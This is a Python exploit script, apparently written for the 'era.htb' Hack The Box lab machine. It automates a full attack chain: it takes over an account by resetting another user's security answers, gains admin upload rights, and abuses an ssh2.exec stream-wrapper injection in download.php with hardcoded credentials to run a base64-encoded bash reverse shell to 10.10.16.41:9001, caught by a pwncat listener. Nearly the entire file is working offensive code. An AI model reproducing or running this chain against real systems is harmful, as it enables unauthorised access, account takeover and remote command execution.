#!/bin/python3

import requests, io, random, string, re, random, os, base64
import pexpect


ip = '10.10.16.41' # Change this
port = '9001'      # Change this

def b64_shell():
    raw_s = f"(bash >& /dev/tcp/{ip}/{port} 0>&1) &\n"
    encode_s = base64.b64encode(raw_s.encode())
    return encode_s.decode("ascii")


baseurl = 'http://file.era.htb'
req = requests.post(baseurl+"/security_login.php", data={"username": "yuri"})

if req.status_code == 200:
    yuri_cookie = req.headers['Set-Cookie']
    print('[+] Trying to login as yuri!')
    sec_req = requests.post(baseurl+'/reset.php', data={"username": "admin_ef01cab31aa", "new_answer1": "admin_ef01cab31aa", "new_answer2": "admin_ef01cab31aa", "new_answer3": "admin_ef01cab31aa"}, headers={"Cookie": f"{yuri_cookie}"})
    if sec_req.status_code and 'answers have been updated' in sec_req.text:
        print('[+] Sucessfully logged in as yuri!')
        admin_req = requests.post(baseurl+"/security_login.php", data={"username": "admin_ef01cab31aa", "answer1": "admin_ef01cab31aa", "answer2": "admin_ef01cab31aa", "answer3": "admin_ef01cab31aa"})
        admin_cookie = admin_req.headers['Set-Cookie']
        print("[+] Updating admin security questions!")


        # # Admin file upload
        def generate_boundary():
            prefix = "---------------------------"
            suffix = ''.join(random.choices(string.digits, k=45))
            return prefix + suffix

        boundary = generate_boundary()

        admin_body = (
            f"--{boundary}\r\n"
            'Content-Disposition: form-data; name="fsubmitted"\r\n\r\n'
            "true\r\n"
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="upfile[]"; filename="hello{random.randint(1, 100)}.txt"\r\n'
            "Content-Type: application/octet-stream\r\n\r\n"
            "hello world\r\n"
            f"--{boundary}--\r\n"
        )

        admin_headers = {
            "Host": "file.era.htb",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "Content-Length": str(len(admin_body)),
            "Origin": f"http://file.era.htb",
            "Connection": "keep-alive",
            "Referer": f"http://file.era.htb/upload.php",
            "Cookie": f"{admin_cookie}",
            "Upgrade-Insecure-Requests": "1",
            "Priority": "u=0, i"
        }
        admin_upload = requests.post(baseurl+"/upload.php", data=admin_body.encode(), headers=admin_headers)
        if admin_upload.status_code == 200 and 'Upload Successful!' in admin_upload.content.decode("utf-8"):
            print("[+] Successfully file uploaded as admin user!")
            file_upload_url = re.findall(r'http[s]?:\/\/[^\s]+\/download\.php\?id=\d+', admin_upload.content.decode("utf-8"))[0]
            
            # Checking if pwncat is installed or not
            if int(os.system('which pwncat 1>/dev/null')) == 0:
                print('[+] Pwncat is already installed!\n')
            else: os.system('sudo apt install pwncat -y')

            shell_url = f"'{file_upload_url}&show=true&format=ssh2.exec://eric:america@127.0.0.1/bash%20-c%20%27echo%20{b64_shell()}%20|base64%20-d|bash;%27' -H 'Cookie: {admin_cookie}'"
            print("[+] Shell executing: curl", shell_url, '\n')
            os.system(f"curl {shell_url}")

            print(f"\n[+] pwncat -l {port}\n")
            os.system(f"pwncat -l {port}")
            # # Start netcat listener
            # listener = pexpect.spawn(f"pwncat -l {port}", encoding='utf-8')
            # print(f"[+] Pwncat listener started on port {port}")

            # # Wait for connection message
            # listener.expect("Connection from", timeout=None)
            # print("[!] Connection received!")
            # listener.interact()